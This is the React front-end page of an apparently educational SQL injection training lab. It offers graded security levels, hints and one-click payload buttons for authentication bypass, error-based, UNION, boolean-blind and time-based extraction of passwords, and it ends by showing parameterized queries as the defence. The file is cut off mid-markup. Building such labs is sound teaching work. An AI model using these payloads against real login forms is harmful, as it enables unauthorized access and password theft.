'use client';

import { useState } from 'react';

type SecurityLevel = 'low' | 'medium' | 'high' | 'expert' | 'blind' | 'time-based' | 'very-high';

const HINTS = {
  low: [
    "💡 Try using SQL comments (--) to ignore the password check",
    "💡 The classic ' OR '1'='1 works here",
    "💡 SQL errors are shown - use them to understand the query structure",
    "💡 No filtering at all - anything goes!"
  ],
  medium: [
    "💡 Comments (--) are blocked, but OR logic still works",
    "💡 Try using OR with conditions that don't need comments",
    "💡 Think about how to make the WHERE clause always true",
    "💡 Hint: ' OR 'a'='a works without using blocked keywords"
  ],
  high: [
    "💡 Most SQL keywords are blocked... but not all",
    "💡 Email validation requires @ and . - work within those constraints",
    "💡 Think creatively about boolean logic",
    "💡 Advanced: Try using LIKE or other comparison operators",
    "💡 Super hard: ' OR email LIKE '%' might work..."
  ],
  expert: [
    "💡 This simulates a Web Application Firewall (WAF)",
    "💡 Most injection patterns are detected and blocked",
    "💡 Try encoding, case variations, or unusual syntax",
    "💡 Think about what patterns the WAF might miss",
    "💡 Ultra hard: Look for edge cases in validation logic",
    "💡 Hint: What if you use unusual characters or Unicode?"
  ],
  blind: [
    "💡 No query shown, no errors, no data - only success/fail",
    "💡 Use boolean-based blind injection techniques",
    "💡 Test with conditions that return true/false",
    "💡 Example: ' AND '1'='1 (true) vs ' AND '1'='2 (false)",
    "💡 Extract data one bit at a time using true/false responses",
    "💡 Try: admin@example.com' AND SUBSTR(password,1,1)='a"
  ],
  'time-based': [
    "💡 Extract data by measuring response time",
    "💡 Use RANDOMBLOB() to create CPU delays in SQLite",
    "💡 Example: ' AND RANDOMBLOB(100000000) AND '1'='1",
    "💡 If condition is true, query takes longer",
    "💡 Extract password: ' AND SUBSTR(password,1,1)='a' AND RANDOMBLOB(100000000)--",
    "💡 Watch the responseTime field - delays mean true!"
  ],
  'very-high': [
    "💡 This uses parameterized queries - the proper defense",
    "💡 Your input is treated as DATA, not CODE",
    "💡 Try all your previous attacks - they won't work!",
    "💡 This is how you should ALWAYS write database queries"
  ]
};

const LEVEL_INFO = {
  low: {
    color: 'green',
    emoji: '🟢',
    title: 'LOW SECURITY',
    description: 'Very Easy - No protection at all',
    endpoint: '/api/login-vulnerable'
  },
  medium: {
    color: 'yellow',
    emoji: '🟡',
    title: 'MEDIUM SECURITY',
    description: 'Moderate - Basic keyword filtering',
    endpoint: '/api/login-medium'
  },
  high: {
    color: 'orange',
    emoji: '🟠',
    title: 'HIGH SECURITY',
    description: 'Hard - Advanced filtering & validation',
    endpoint: '/api/login-high'
  },
  expert: {
    color: 'purple',
    emoji: '🟣',
    title: 'EXPERT SECURITY',
    description: 'Very Hard - WAF simulation',
    endpoint: '/api/login-expert'
  },
  blind: {
    color: 'blue',
    emoji: '🔵',
    title: 'BLIND INJECTION',
    description: 'Advanced - No feedback, only success/fail',
    endpoint: '/api/login-blind'
  },
  'time-based': {
    color: 'cyan',
    emoji: '⏱️',
    title: 'TIME-BASED BLIND',
    description: 'Expert - Extract data via timing',
    endpoint: '/api/login-time-based'
  },
  'very-high': {
    color: 'red',
    emoji: '🔴',
    title: 'VERY HIGH SECURITY',
    description: 'Not Injectable - Parameterized queries',
    endpoint: '/api/login-secure'
  }
};

export default function Home() {
  const [level, setLevel] = useState<SecurityLevel>('low');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [response, setResponse] = useState<any>(null);
  const [loading, setLoading] = useState(false);
  const [showHints, setShowHints] = useState(false);

  // SQL Practice state
  const [showSqlPractice, setShowSqlPractice] = useState(false);
  const [sqlQuery, setSqlQuery] = useState('SELECT * FROM users');
  const [sqlResponse, setSqlResponse] = useState<any>(null);
  const [sqlLoading, setSqlLoading] = useState(false);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setResponse(null);

    const endpoint = LEVEL_INFO[level].endpoint;

    try {
      const res = await fetch(endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password })
      });

      const data = await res.json();
      setResponse(data);
    } catch (error: any) {
      setResponse({ success: false, message: error.message });
    } finally {
      setLoading(false);
    }
  };

  const handleSqlPractice = async (e: React.FormEvent) => {
    e.preventDefault();
    setSqlLoading(true);
    setSqlResponse(null);

    try {
      const res = await fetch('/api/sql-practice', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ query: sqlQuery })
      });

      const data = await res.json();
      setSqlResponse(data);
    } catch (error: any) {
      setSqlResponse({ success: false, message: error.message });
    } finally {
      setSqlLoading(false);
    }
  };

  const quickFillSql = (query: string) => {
    setSqlQuery(query);
  };

  const quickFill = (testEmail: string, testPassword: string) => {
    setEmail(testEmail);
    setPassword(testPassword);
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  const PayloadButton = ({ email, password, className, label }: { email: string; password: string; className: string; label: string }) => (
    <div className="relative group">
      <button onClick={() => quickFill(email, password)} className={`w-full text-left p-2 pr-20 rounded text-sm transition-colors ${className}`}>
        {label}
      </button>
      <button
        onClick={(e) => { e.stopPropagation(); copyToClipboard(`Email: ${email}\nPassword: ${password}`); }}
        className="absolute right-2 top-1/2 -translate-y-1/2 opacity-0 group-hover:opacity-100 transition-opacity px-2 py-1 bg-blue-600 hover:bg-blue-700 rounded text-xs whitespace-nowrap"
      >
        📋 Copy
      </button>
    </div>
  );

  const SqlPayloadButton = ({ query, className }: { query: string; className: string }) => (
    <div className="relative group">
      <button onClick={() => setSqlQuery(query)} className={`w-full text-left p-2 pr-20 rounded text-xs transition-colors font-mono ${className}`}>
        {query}
      </button>
      <button
        onClick={(e) => { e.stopPropagation(); copyToClipboard(query); }}
        className="absolute right-2 top-1/2 -translate-y-1/2 opacity-0 group-hover:opacity-100 transition-opacity px-2 py-1 bg-blue-600 hover:bg-blue-700 rounded text-xs whitespace-nowrap"
      >
        📋 Copy
      </button>
    </div>
  );

  const currentLevel = LEVEL_INFO[level];

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-gray-900 text-white p-4 md:p-8">
      <div className="max-w-7xl mx-auto">
        <div className="text-center mb-8">
          <h1 className="text-3xl md:text-4xl font-bold mb-2">🔐 SQL Injection Challenge Lab</h1>
          <p className="text-gray-400">Progressive Difficulty - Learn by Breaking & Fixing</p>
          <div className="mt-4 flex justify-center gap-4">
            <button
              onClick={() => setShowSqlPractice(!showSqlPractice)}
              className={`px-6 py-2 rounded-lg font-semibold transition-all ${showSqlPractice
                ? 'bg-blue-600 text-white'
                : 'bg-gray-700 text-gray-300 hover:bg-gray-600'
                }`}
            >
              {showSqlPractice ? '🎯 Hide SQL Practice' : '📚 Learn SQL First'}
            </button>
            <a
              href="/xss"
              className="px-6 py-2 rounded-lg font-semibold bg-red-600 hover:bg-red-700 text-white transition-all"
            >
              🎭 Learn XSS →
            </a>
          </div>
        </div>

        {/* SQL Practice Section */}
        {showSqlPractice && (
          <div className="mb-8 bg-gradient-to-br from-blue-900/30 to-purple-900/30 rounded-lg p-6 border-2 border-blue-700">
            <div className="flex items-center gap-3 mb-4">
              <span className="text-3xl">📚</span>
              <div>
                <h2 className="text-2xl font-bold">SQL Practice Zone</h2>
                <p className="text-sm text-gray-400">Learn SQL queries before attempting injection</p>
              </div>
            </div>

            <div className="grid lg:grid-cols-2 gap-6">
              {/* SQL Query Input */}
              <div className="bg-gray-800 rounded-lg p-4 border border-gray-700">
                <form onSubmit={handleSqlPractice} className="space-y-4">
                  <div>
                    <label className="block text-sm mb-2 font-semibold">Write Your SQL Query:</label>
                    <textarea
                      value={sqlQuery}
                      onChange={(e) => setSqlQuery(e.target.value)}
                      className="w-full p-3 bg-gray-900 rounded border border-gray-600 focus:border-blue-500 outline-none font-mono text-sm h-32"
                      placeholder="SELECT * FROM users WHERE email = 'admin@example.com'"
                    />
                  </div>

                  <button
                    type="submit"
                    disabled={sqlLoading}
                    className="w-full py-3 bg-blue-600 hover:bg-blue-700 rounded font-semibold disabled:opacity-50 transition-colors"
                  >
                    {sqlLoading ? 'Executing...' : '▶️ Run Query'}
                  </button>
                </form>

                {/* Example Queries */}
                <div className="mt-4 pt-4 border-t border-gray-700">
                  <p className="text-sm text-gray-400 mb-3">📖 Example Queries:</p>
                  <div className="space-y-2">
                    <div className="text-xs font-semibold text-blue-400 mb-1">Basic Queries:</div>
                    <SqlPayloadButton query="SELECT * FROM users" className="bg-gray-700 hover:bg-gray-600" />
                    <SqlPayloadButton query="SELECT * FROM users WHERE email = 'admin@example.com'" className="bg-gray-700 hover:bg-gray-600" />
                    <SqlPayloadButton query="SELECT email, role FROM users WHERE role = 'admin'" className="bg-gray-700 hover:bg-gray-600" />

                    <div className="text-xs font-semibold text-yellow-400 mb-1 mt-3">Aggregate Functions:</div>
                    <SqlPayloadButton query="SELECT COUNT(*) as total FROM users" className="bg-gray-700 hover:bg-gray-600" />
                    <SqlPayloadButton query="SELECT role, COUNT(*) as count FROM users GROUP BY role" className="bg-gray-700 hover:bg-gray-600" />

                    <div className="text-xs font-semibold text-green-400 mb-1 mt-3">String Functions:</div>
                    <SqlPayloadButton query="SELECT email, SUBSTR(password, 1, 3) as pwd_start FROM users" className="bg-gray-700 hover:bg-gray-600" />
                    <SqlPayloadButton query="SELECT email, LENGTH(password) as pwd_length FROM users" className="bg-gray-700 hover:bg-gray-600" />
                    <SqlPayloadButton query="SELECT * FROM users WHERE email LIKE '%example.com'" className="bg-gray-700 hover:bg-gray-600" />

                    <div className="text-xs font-semibold text-purple-400 mb-1 mt-3">Conditional Logic:</div>
                    <SqlPayloadButton query="SELECT email, CASE WHEN role = 'admin' THEN 'Administrator' ELSE 'Regular User' END as user_type FROM users" className="bg-gray-700 hover:bg-gray-600" />
                    <SqlPayloadButton query="SELECT email, CASE WHEN SUBSTR(password,1,1)='a' THEN 'Starts with a' ELSE 'Other' END FROM users" className="bg-gray-700 hover:bg-gray-600" />

                    <div className="text-xs font-semibold text-orange-400 mb-1 mt-3">Subqueries:</div>
                    <SqlPayloadButton query="SELECT * FROM users WHERE role = (SELECT role FROM users WHERE email = 'admin@example.com')" className="bg-gray-700 hover:bg-gray-600" />
                    <SqlPayloadButton query="SELECT email, (SELECT COUNT(*) FROM users) as total_users FROM users LIMIT 1" className="bg-gray-700 hover:bg-gray-600" />

                    <div className="text-xs font-semibold text-cyan-400 mb-1 mt-3">System Functions:</div>
                    <SqlPayloadButton query="SELECT sqlite_version() as version" className="bg-gray-700 hover:bg-gray-600" />
                    <SqlPayloadButton query="SELECT name FROM sqlite_master WHERE type='table'" className="bg-gray-700 hover:bg-gray-600" />
                    <SqlPayloadButton query="SELECT sql FROM sqlite_master WHERE name='users'" className="bg-gray-700 hover:bg-gray-600" />

                    <div className="text-xs font-semibold text-red-400 mb-1 mt-3">Advanced - Injection Techniques:</div>
                    <SqlPayloadButton query="SELECT * FROM users WHERE email = 'admin@example.com' AND password = 'admin123'" className="bg-gray-700 hover:bg-gray-600" />
                    <SqlPayloadButton query="SELECT * FROM users WHERE email = 'admin@example.com' OR '1'='1'" className="bg-blue-900/50 hover:bg-blue-900/70 border border-blue-700" />
                    <SqlPayloadButton query="SELECT * FROM users WHERE email = 'admin@example.com' AND '1'='1'" className="bg-blue-900/50 hover:bg-blue-900/70 border border-blue-700" />
                    <SqlPayloadButton query="SELECT * FROM users WHERE email = 'admin@example.com' AND '1'='2'" className="bg-blue-900/50 hover:bg-blue-900/70 border border-blue-700" />
                    <SqlPayloadButton query="SELECT * FROM users WHERE email = 'x' OR email LIKE '%'" className="bg-blue-900/50 hover:bg-blue-900/70 border border-blue-700" />
                    <SqlPayloadButton query="SELECT email, CASE WHEN SUBSTR(password,1,1)='a' THEN 'YES' ELSE 'NO' END as starts_with_a FROM users WHERE email='admin@example.com'" className="bg-blue-900/50 hover:bg-blue-900/70 border border-blue-700" />
                  </div>
                </div>
              </div>

              {/* SQL Results */}
              <div className="bg-gray-800 rounded-lg p-4 border border-gray-700">
                <h3 className="text-lg font-bold mb-4">Query Results</h3>
                {sqlResponse ? (
                  <div className="space-y-4">
                    <div className={`p-3 rounded border ${sqlResponse.success
                      ? 'bg-green-900/30 border-green-600'
                      : 'bg-red-900/30 border-red-600'
                      }`}>
                      <p className="font-semibold text-sm">{sqlResponse.message}</p>
                      {sqlResponse.rowCount !== undefined && (
                        <p className="text-xs text-gray-400 mt-1">Rows returned: {sqlResponse.rowCount}</p>
                      )}
                    </div>

                    {sqlResponse.result && sqlResponse.result.length > 0 && (
                      <div className="bg-gray-900 p-3 rounded border border-green-700 max-h-96 overflow-auto">
                        <p className="text-xs text-gray-400 mb-2 font-semibold">📊 Data Retrieved:</p>
                        <pre className="text-xs text-green-400 font-mono">
                          {JSON.stringify(sqlResponse.result, null, 2)}
                        </pre>
                      </div>
                    )}

                    {sqlResponse.error && (
                      <div className="bg-gray-900 p-3 rounded border border-red-700">
                        <p className="text-xs text-gray-400 mb-2 font-semibold">💥 Error:</p>
                        <code className="text-xs text-red-400 font-mono block">{sqlResponse.error}</code>
                        {sqlResponse.hint && (
                          <p className="text-xs text-yellow-400 mt-2">💡 {sqlResponse.hint}</p>
                        )}
                      </div>
                    )}

                    {sqlResponse.query && (
                      <div className="bg-gray-900 p-3 rounded border border-gray-700">
                        <p className="text-xs text-gray-400 mb-2 font-semibold">🔍 Your Query:</p>
                        <code className="text-xs text-blue-400 font-mono block">{sqlResponse.query}</code>
                      </div>
                    )}
                  </div>
                ) : (
                  <div className="text-center py-12 text-gray-500">
                    <div className="text-4xl mb-4">📚</div>
                    <p>Write a SQL query and click "Run Query"</p>
                    <p className="text-sm mt-2">Practice SELECT statements to understand SQL!</p>
                  </div>
                )}
              </div>
            </div>

            {/* SQL Learning Tips */}
            <div className="mt-6 grid md:grid-cols-2 lg:grid-cols-4 gap-4">
              <div className="bg-gray-800 p-4 rounded border border-gray-700">
                <p className="font-semibold text-blue-400 mb-2">🎯 Basic Syntax</p>
                <code className="text-xs text-gray-300 block">SELECT column FROM table</code>
                <code className="text-xs text-gray-300 block mt-1">WHERE condition</code>
                <code className="text-xs text-gray-300 block mt-1">ORDER BY column</code>
                <code className="text-xs text-gray-300 block mt-1">LIMIT n</code>
              </div>
              <div className="bg-gray-800 p-4 rounded border border-gray-700">
                <p className="font-semibold text-yellow-400 mb-2">💡 Operators</p>
                <code className="text-xs text-gray-300 block">= != &lt; &gt; (comparison)</code>
                <code className="text-xs text-gray-300 block mt-1">AND, OR (logic)</code>
                <code className="text-xs text-gray-300 block mt-1">LIKE '%pattern%'</code>
                <code className="text-xs text-gray-300 block mt-1">IN (val1, val2)</code>
              </div>
              <div className="bg-gray-800 p-4 rounded border border-gray-700">
                <p className="font-semibold text-green-400 mb-2">🔍 Functions</p>
                <code className="text-xs text-gray-300 block">COUNT(*), SUM(), AVG()</code>
                <code className="text-xs text-gray-300 block mt-1">SUBSTR(str, pos, len)</code>
                <code className="text-xs text-gray-300 block mt-1">LENGTH(str)</code>
                <code className="text-xs text-gray-300 block mt-1">sqlite_version()</code>
              </div>
              <div className="bg-gray-800 p-4 rounded border border-gray-700">
                <p className="font-semibold text-purple-400 mb-2">🚀 Advanced</p>
                <code className="text-xs text-gray-300 block">CASE WHEN...THEN...END</code>
                <code className="text-xs text-gray-300 block mt-1">(SELECT...) subquery</code>
                <code className="text-xs text-gray-300 block mt-1">GROUP BY column</code>
                <code className="text-xs text-gray-300 block mt-1">sqlite_master (metadata)</code>
              </div>
            </div>

            {/* Advanced SQL Concepts */}
            <div className="mt-6 bg-gray-900 p-4 rounded border border-gray-700">
              <p className="font-semibold text-cyan-400 mb-3">📚 Advanced SQL Concepts for Injection:</p>
              <div className="grid md:grid-cols-2 gap-4 text-xs">
                <div>
                  <p className="font-semibold text-yellow-400 mb-2">SUBSTR() - Extract Characters:</p>
                  <code className="text-gray-300 block bg-gray-800 p-2 rounded">SUBSTR(password, 1, 1) = 'a'</code>
                  <p className="text-gray-400 mt-1">Used in blind injection to extract data character by character</p>
                </div>
                <div>
                  <p className="font-semibold text-yellow-400 mb-2">CASE - Conditional Logic:</p>
                  <code className="text-gray-300 block bg-gray-800 p-2 rounded">CASE WHEN condition THEN result ELSE other END</code>
                  <p className="text-gray-400 mt-1">Used in time-based injection to trigger delays conditionally</p>
                </div>
                <div>
                  <p className="font-semibold text-yellow-400 mb-2">sqlite_master - System Table:</p>
                  <code className="text-gray-300 block bg-gray-800 p-2 rounded">SELECT name FROM sqlite_master WHERE type='table'</code>
                  <p className="text-gray-400 mt-1">Reveals database structure (tables, columns)</p>
                </div>
                <div>
                  <p className="font-semibold text-yellow-400 mb-2">Boolean Logic:</p>
                  <code className="text-gray-300 block bg-gray-800 p-2 rounded">'1'='1' (always true)</code>
                  <code className="text-gray-300 block bg-gray-800 p-2 rounded mt-1">'1'='2' (always false)</code>
                  <p className="text-gray-400 mt-1">Core of blind SQL injection techniques</p>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Security Level Selector */}
        <div className="mb-8 bg-gray-800 rounded-lg p-6 border border-gray-700">
          <h2 className="text-xl font-bold mb-4">Select Security Level</h2>
          <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-7 gap-3">
            {(Object.keys(LEVEL_INFO) as SecurityLevel[]).map((lvl) => {
              const info = LEVEL_INFO[lvl];
              return (
                <button
                  key={lvl}
                  onClick={() => {
                    setLevel(lvl);
                    setResponse(null);
                    setShowHints(false);
                  }}
                  className={`p-4 rounded-lg border-2 transition-all ${level === lvl
                    ? 'border-blue-500 bg-blue-900/30'
                    : 'border-gray-600 bg-gray-700 hover:border-gray-500'
                    }`}
                >
                  <div className="text-2xl mb-2">{info.emoji}</div>
                  <div className="font-semibold text-sm">{info.title}</div>
                  <div className="text-xs text-gray-400 mt-1">{info.description}</div>
                </button>
              );
            })}
          </div>
        </div>

        <div className="grid lg:grid-cols-2 gap-6">
          {/* Login Form */}
          <div className="bg-gray-800 rounded-lg p-6 border border-gray-700">
            <div className="flex items-center justify-between mb-6">
              <div>
                <h2 className="text-2xl font-bold flex items-center gap-2">
                  {currentLevel.emoji} {currentLevel.title}
                </h2>
                <p className="text-sm text-gray-400">{currentLevel.description}</p>
              </div>
            </div>

            <form onSubmit={handleLogin} className="space-y-4">
              <div>
                <label className="block text-sm mb-2">Email</label>
                <input
                  type="text"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full p-3 bg-gray-700 rounded border border-gray-600 focus:border-blue-500 outline-none font-mono text-sm"
                  placeholder="Enter email or SQL injection payload"
                />
              </div>

              <div>
                <label className="block text-sm mb-2">Password</label>
                <input
                  type="text"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full p-3 bg-gray-700 rounded border border-gray-600 focus:border-blue-500 outline-none font-mono text-sm"
                  placeholder="Enter password or SQL injection payload"
                />
              </div>

              <button
                type="submit"
                disabled={loading}
                className="w-full py-3 bg-blue-600 hover:bg-blue-700 rounded font-semibold disabled:opacity-50 transition-colors"
              >
                {loading ? 'Testing...' : '🚀 Attempt Login'}
              </button>
            </form>

            {/* Hints Section */}
            <div className="mt-6 pt-6 border-t border-gray-700">
              <button
                onClick={() => setShowHints(!showHints)}
                className="w-full text-left p-3 bg-gray-700 hover:bg-gray-600 rounded font-semibold flex items-center justify-between transition-colors"
              >
                <span>💡 Need Hints?</span>
                <span>{showHints ? '▼' : '▶'}</span>
              </button>

              {showHints && (
                <div className="mt-3 space-y-2">
                  {HINTS[level].map((hint, idx) => (
                    <div key={idx} className="p-3 bg-gray-900 rounded text-sm text-gray-300">
                      {hint}
                    </div>
                  ))}
                </div>
              )}
            </div>

            {/* Quick Test Buttons - Dynamic based on level */}
            <div className="mt-4 pt-4 border-t border-gray-700">
              <p className="text-sm text-gray-400 mb-3">Quick Tests for {currentLevel.title}:</p>
              <div className="space-y-2">
                {/* Normal Login - Works on all levels */}
                <PayloadButton email="admin@example.com" password="admin123" className="bg-gray-700 hover:bg-gray-600" label="✅ Normal Login (Valid Credentials)" />

                {/* LOW Security Tests */}
                {level === 'low' && (
                  <>
                    <PayloadButton email="admin@example.com' --" password="anything" className="bg-green-900/30 hover:bg-green-900/50 border border-green-700" label="💉 Comment Injection: admin@example.com' --" />
                    <PayloadButton email="' OR '1'='1" password="' OR '1'='1" className="bg-green-900/30 hover:bg-green-900/50 border border-green-700" label="💉 OR 1=1: ' OR '1'='1" />
                    <PayloadButton email="' OR 'x'='x" password="' OR 'x'='x" className="bg-green-900/30 hover:bg-green-900/50 border border-green-700" label="💉 OR x=x: ' OR 'x'='x" />
                    <PayloadButton email="' OR 1=1 --" password="ignored" className="bg-green-900/30 hover:bg-green-900/50 border border-green-700" label="💉 Numeric OR: ' OR 1=1 --" />
                    <PayloadButton email="admin@example.com' OR '1'='1' --" password="ignored" className="bg-green-900/30 hover:bg-green-900/50 border border-green-700" label="💉 Combined Attack: admin@example.com' OR '1'='1' --" />
                    <PayloadButton email="' OR 'a'='a' --" password="' OR 'a'='a' --" className="bg-green-900/30 hover:bg-green-900/50 border border-green-700" label="💉 Double OR: ' OR 'a'='a' --" />
                    <PayloadButton email="admin@example.com'" password="test" className="bg-red-900/30 hover:bg-red-900/50 border border-red-700" label="💥 Trigger SQL Error: admin@example.com'" />
                    <PayloadButton email="' OR 1=CONVERT(int, 'test') --" password="x" className="bg-red-900/30 hover:bg-red-900/50 border border-red-700" label="💥 Error-Based (SQL Server): ' OR 1=CONVERT(...)" />
                    <PayloadButton email="' AND 1=1 UNION SELECT NULL--" password="x" className="bg-red-900/30 hover:bg-red-900/50 border border-red-700" label="💥 UNION Error: ' AND 1=1 UNION SELECT NULL--" />
                    <PayloadButton email="' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT email FROM users LIMIT 1),0x3a,FLOOR(RAND()*2))x FROM users GROUP BY x)y)--" password="x" className="bg-red-900/30 hover:bg-red-900/50 border border-red-700" label="💥 Extract Data via Error: ' AND (SELECT...)" />
                  </>
                )}

                {/* MEDIUM Security Tests */}
                {level === 'medium' && (
                  <>
                    <PayloadButton email="' OR 'a'='a" password="' OR 'a'='a" className="bg-yellow-900/30 hover:bg-yellow-900/50 border border-yellow-700" label="💉 OR Without Comments: ' OR 'a'='a" />
                    <PayloadButton email="' OR 1=1 OR ''='" password="x" className="bg-yellow-900/30 hover:bg-yellow-900/50 border border-yellow-700" label="💉 Numeric Boolean: ' OR 1=1 OR ''='" />
                    <PayloadButton email="' OR 'x'='x" password="' OR 'x'='x" className="bg-yellow-900/30 hover:bg-yellow-900/50 border border-yellow-700" label="💉 Alternative Quotes: ' OR 'x'='x" />
                    <PayloadButton email="admin@example.com' --" password="anything" className="bg-gray-700 hover:bg-gray-600 opacity-60" label="❌ Blocked: Comments --" />
                  </>
                )}

                {/* HIGH Security Tests */}
                {level === 'high' && (
                  <>
                    <PayloadButton email="admin@example.com' OR email LIKE '%" password="x" className="bg-orange-900/30 hover:bg-orange-900/50 border border-orange-700" label="💉 LIKE Operator: admin@example.com' OR email LIKE '%" />
                    <PayloadButton email="test@x.com' OR 1<2 OR email='" password="x" className="bg-orange-900/30 hover:bg-orange-900/50 border border-orange-700" label="💉 Comparison Operators: test@x.com' OR 1<2 OR email='" />
                    <PayloadButton email="a@b.c' OR '1'='1' AND email LIKE '%" password="x" className="bg-orange-900/30 hover:bg-orange-900/50 border border-orange-700" label="💉 Complex Boolean: a@b.c' OR '1'='1' AND email LIKE '%" />
                    <PayloadButton email="' OR 'a'='a" password="' OR 'a'='a" className="bg-gray-700 hover:bg-gray-600 opacity-60" label="❌ Blocked: Invalid Email Format" />
                  </>
                )}

                {/* EXPERT Security Tests */}
                {level === 'expert' && (
                  <>
                    <PayloadButton email="admin@example.com' OR email LIKE '%" password="x" className="bg-gray-700 hover:bg-gray-600 opacity-60" label="❌ Blocked: LIKE pattern detected" />
                    <PayloadButton email="' OR 'a'='a" password="' OR 'a'='a" className="bg-gray-700 hover:bg-gray-600 opacity-60" label="❌ Blocked: OR pattern detected" />
                    <PayloadButton email="admin@example.com' --" password="anything" className="bg-gray-700 hover:bg-gray-600 opacity-60" label="❌ Blocked: Comment detected" />
                    <div className="p-3 bg-purple-900/30 rounded text-sm border border-purple-700">
                      <p className="font-semibold text-purple-400 mb-1">🛡️ WAF Protected!</p>
                      <p className="text-xs text-gray-300">This level simulates a Web Application Firewall. Most patterns are blocked. Can you find the edge case?</p>
                    </div>
                  </>
                )}

                {/* BLIND Injection Tests */}
                {level === 'blind' && (
                  <>
                    <PayloadButton email="admin@example.com' AND '1'='1" password="x" className="bg-blue-900/30 hover:bg-blue-900/50 border border-blue-700" label="💉 Boolean True: admin@example.com' AND '1'='1" />
                    <PayloadButton email="admin@example.com' AND '1'='2" password="x" className="bg-blue-900/30 hover:bg-blue-900/50 border border-blue-700" label="💉 Boolean False: admin@example.com' AND '1'='2" />
                    <PayloadButton email="admin@example.com' AND SUBSTR(password,1,1)='a" password="x" className="bg-blue-900/30 hover:bg-blue-900/50 border border-blue-700" label="💉 Extract Data: ...AND SUBSTR(password,1,1)='a" />
                    <div className="p-3 bg-blue-900/30 rounded text-sm border border-blue-700">
                      <p className="font-semibold text-blue-400 mb-1">🔵 Blind Injection!</p>
                      <p className="text-xs text-gray-300">No query or data shown. Use true/false responses to extract information bit by bit.</p>
                    </div>
                  </>
                )}

                {/* TIME-BASED Tests */}
                {level === 'time-based' && (
                  <>
                    <PayloadButton email="admin@example.com' AND RANDOMBLOB(100000000) AND '1'='1" password="x" className="bg-cyan-900/30 hover:bg-cyan-900/50 border border-cyan-700" label="⏱️ Time Delay (3s): ...AND RANDOMBLOB(100000000)..." />
                    <PayloadButton email="admin@example.com' AND RANDOMBLOB(50000000) AND '1'='1" password="x" className="bg-cyan-900/30 hover:bg-cyan-900/50 border border-cyan-700" label="⏱️ Time Delay (1.5s): ...AND RANDOMBLOB(50000000)..." />
                    <PayloadButton email="admin@example.com' AND (CASE WHEN SUBSTR(password,1,1)='a' THEN RANDOMBLOB(100000000) ELSE 1 END) AND '1'='1" password="x" className="bg-cyan-900/30 hover:bg-cyan-900/50 border border-cyan-700" label="⏱️ Conditional Delay: ...CASE WHEN...THEN RANDOMBLOB..." />
                    <div className="p-3 bg-cyan-900/30 rounded text-sm border border-cyan-700">
                      <p className="font-semibold text-cyan-400 mb-1">⏱️ Time-Based Blind!</p>
                      <p className="text-xs text-gray-300">Extract data by measuring response time. If condition is true, response is delayed. Watch the responseTime!</p>
                    </div>
                  </>
                )}

                {/* VERY HIGH Security Tests */}
                {level === 'very-high' && (
                  <>
                    <PayloadButton email="' OR '1'='1" password="' OR '1'='1" className="bg-gray-700 hover:bg-gray-600 opacity-60" label="❌ Try: ' OR '1'='1 (Won't work!)" />
                    <PayloadButton email="admin@example.com' --" password="anything" className="bg-gray-700 hover:bg-gray-600 opacity-60" label="❌ Try: admin@example.com' -- (Won't work!)" />
                    <PayloadButton email="admin@example.com' OR email LIKE '%" password="x" className="bg-gray-700 hover:bg-gray-600 opacity-60" label="❌ Try: admin@example.com' OR email LIKE '% (Won't work!)" />
                    <div className="p-3 bg-green-900/30 rounded text-sm border border-green-700">
                      <p className="font-semibold text-green-400 mb-1">🛡️ Properly Secured!</p>
                      <p className="text-xs text-gray-300">This level uses parameterized queries. All injection attempts will fail.</p>
                    </div>
                  </>
                )}
              </div>
            </div>
          </div>

          {/* Response Display */}
          <div className="bg-gray-800 rounded-lg p-6 border border-gray-700">
            <h2 className="text-xl font-bold mb-4">📊 Response</h2>
            {response ? (
              <div className="space-y-4">
                <div className={`p-4 rounded-lg border-2 ${response.success
                  ? 'bg-green-900/30 border-green-600'
                  : 'bg-red-900/30 border-red-600'
                  }`}>
                  <div className="flex items-center gap-2 mb-2">
                    <span className="text-2xl">{response.success ? '✅' : '❌'}</span>
                    <span className="font-semibold">{response.message}</span>
                  </div>
                  {response.level && (
                    <div className="text-xs text-gray-400">Security Level: {response.level}</div>
                  )}
                </div>

                {response.query && (
                  <div className="bg-gray-900 p-4 rounded-lg border border-gray-700">
                    <p className="text-xs text-gray-400 mb-2 font-semibold">🔍 SQL Query Executed:</p>
                    <code className="text-sm text-yellow-400 break-all block font-mono">
                      {response.query}
                    </code>
                  </div>
                )}

                {response.user && (
                  <div className="bg-gray-900 p-4 rounded-lg border border-green-700">
                    <p className="text-xs text-gray-400 mb-2 font-semibold">👤 User Data Retrieved:</p>
                    <pre className="text-sm text-green-400 font-mono overflow-x-auto">
                      {JSON.stringify(response.user, null, 2)}
                    </pre>
                    {response.success && (
                      <div className="mt-3 p-3 bg-green-900/50 rounded border border-green-600">
                        <p className="text-sm font-semibold text-green-300 mb-2">🎉 Attack Successful!</p>
                        <div className="text-xs text-gray-300 space-y-2">
                          <p>You bypassed the authentication and retrieved user data without knowing the password!</p>

                          {response.query && response.query.includes('OR') && (
                            <div className="bg-gray-800 p-2 rounded mt-2">
                              <p className="font-semibold text-yellow-400 mb-1">🔍 How it worked:</p>
                              <ul className="list-disc list-inside space-y-1 ml-2">
                                <li>Your input modified the SQL WHERE clause</li>
                                <li>The OR condition made the query always return true</li>
                                <li>Database returned the first matching user (often admin!)</li>
                                <li>No password verification happened</li>
                              </ul>
                            </div>
                          )}

                          {response.query && response.query.includes('--') && (
                            <div className="bg-gray-800 p-2 rounded mt-2">
                              <p className="font-semibold text-yellow-400 mb-1">🔍 How it worked:</p>
                              <ul className="list-disc list-inside space-y-1 ml-2">
                                <li>The <code className="text-yellow-300">--</code> started a SQL comment</li>
                                <li>Everything after it was ignored (including password check!)</li>
                                <li>Only the email was verified</li>
                                <li>You logged in without the password</li>
                              </ul>
                            </div>
                          )}

                          {response.query && response.query.includes('LIKE') && (
